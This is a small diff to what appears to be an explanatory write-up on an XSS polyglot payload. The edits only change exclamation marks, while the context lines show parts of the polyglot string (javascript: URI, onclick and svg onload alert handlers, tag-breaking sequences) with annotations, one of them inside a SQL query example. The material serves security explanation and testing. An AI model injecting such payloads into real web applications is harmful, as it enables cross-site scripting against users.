@@ -20,7 +20,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 * `(/* */oNcliCk=alert() )`: A tangled execution zone wrapped in invoking parenthesis!
 * `//%0D%0A%0d%0a//`: A single-line comment in ECMAScript; a double-CRLF in HTTP response headers.
 * `</stYle/</titLe/</teXtarEa/</scRipt/--!>`: A sneaky HTML-tag-breaker sequence.
-* `\x3csVg/<sVg/oNloAd=alert()//>\x3e`: An innocuous svg element!!
+* `\x3csVg/<sVg/oNloAd=alert()//>\x3e`: An innocuous svg element.
 
 __Total length: 144 characters.__
 
@@ -294,4 +294,4 @@ SELECT * FROM Users WHERE Username="jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk
 
 ````
 
-###### And even more; eish...I'm tired counting down already!!
+###### And even more; eish...I'm tired counting down already!
